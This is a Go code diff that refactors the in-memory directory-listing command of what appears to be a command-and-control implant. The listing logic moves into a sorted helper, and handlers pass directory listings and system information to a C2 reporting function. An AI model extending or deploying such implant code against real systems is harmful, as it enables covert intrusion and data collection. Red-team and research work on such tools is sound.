@@ -8,6 +8,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"sort"
 	"strconv"
 	"strings"
 	"time"
@@ -44,46 +45,7 @@ func runListDir(cmd *cobra.Command, args []string) {
 			c2transport.NotifyC2(cmd, "")
 			return
 		}
-
-		// Use a map to deduplicate entries
-		entries := make(map[string]bool)
-
-		for _, f := range files {
-			if !strings.HasPrefix(f, path) {
-				continue
-			}
-
-			// Get relative part
-			rel := strings.TrimPrefix(f, path)
-			if rel == "" {
-				// Exact match (file or dir root?)
-				// If it's a file, we might want to list it?
-				// But typically ls lists contents.
-				continue
-			}
-
-			// Find next separator
-			// If rel starts with /, we treat / as the segment (directory)
-			// e.g. path="mem:", rel="///file" -> seg="/"
-			// path="mem:///", rel="file" -> seg="file"
-			// path="mem:///dir", rel="/file" -> seg="/"
-
-			seg := rel
-			if idx := strings.Index(rel, "/"); idx != -1 {
-				// Include the slash to indicate there is more
-				seg = rel[:idx+1]
-			}
-
-			entries[seg] = true
-		}
-
-		var out []string
-		// Prepend CWD line.
-		out = append(out, path)
-
-		for seg := range entries {
-			out = append(out, seg)
-		}
+		out := getMemFileCompletions(path, files)
 		c2transport.NotifyC2(cmd, "%s", strings.Join(out, "\n"))
 	}
 
@@ -491,4 +453,51 @@ func runSysInfo(cmd *cobra.Command, args []string) {
 		return
 	}
 	c2transport.NotifyC2(cmd, "%s\n", string(data))
+}
+
+// getMemFileCompletions works as ls completion
+func getMemFileCompletions(prefix string, files []string) []string {
+	// Use a map to deduplicate entries
+	entries := make(map[string]bool)
+
+	for _, f := range files {
+		if !strings.HasPrefix(f, prefix) {
+			continue
+		}
+
+		// Get relative part
+		rel := strings.TrimPrefix(f, prefix)
+		if rel == "" {
+			// Exact match (file or dir root?)
+			// If it's a file, we might want to list it?
+			// But typically ls lists contents.
+			continue
+		}
+
+		// Find next separator
+		// If rel starts with /, we treat / as the segment (directory)
+		// e.g. path="mem:", rel="///file" -> seg="/"
+		// path="mem:///", rel="file" -> seg="file"
+		// path="mem:///dir", rel="/file" -> seg="/"
+
+		seg := rel
+		if idx := strings.Index(rel, "/"); idx != -1 {
+			// Include the slash to indicate there is more
+			seg = rel[:idx+1]
+		}
+
+		entries[seg] = true
+	}
+
+	var out []string
+	// Prepend CWD line.
+	out = append(out, prefix)
+
+	for seg := range entries {
+		out = append(out, seg)
+	}
+	// Sort for deterministic output
+	sort.Strings(out[1:])
+
+	return out
 }
